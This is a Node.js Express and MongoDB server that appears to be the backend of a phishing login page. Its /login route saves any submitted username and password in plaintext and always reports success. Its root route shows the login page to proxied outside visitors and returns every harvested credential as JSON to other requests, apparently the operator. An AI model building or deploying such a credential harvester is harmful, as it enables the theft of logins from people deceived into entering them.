const express = require('express');
const { MongoClient } = require('mongodb');
const path = require('path');

const app = express();
const port = 3000;


const url = process.env.MONGO_URL || 'mongodb://localhost:27017';
const client = new MongoClient(url);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

async function main() {
  await client.connect();
  console.log('MongoDB conectado');

  const db = client.db('mydatabase');
  const users = db.collection('users');


  app.post('/login', async (req, res) => {
    const { user, pass } = req.body;
    if (!user || !pass) return res.json({ success: false });

    await users.insertOne({ user, pass, createdAt: new Date() });
    res.json({ success: true });
  });


  app.get('/', async (req, res) => {

    if (req.headers['x-forwarded-for']) {
      return res.sendFile(path.join(__dirname, 'views', 'login.html'));
    } else {

      const data = await users.find({}).toArray();
      return res.json(data);
    }
  });


  app.use(express.static(path.join(__dirname, 'public')));
  app.listen(port, () =>
    console.log(`App listening at http://localhost:${port}`)
  );
}

main().catch(err => console.error(err));
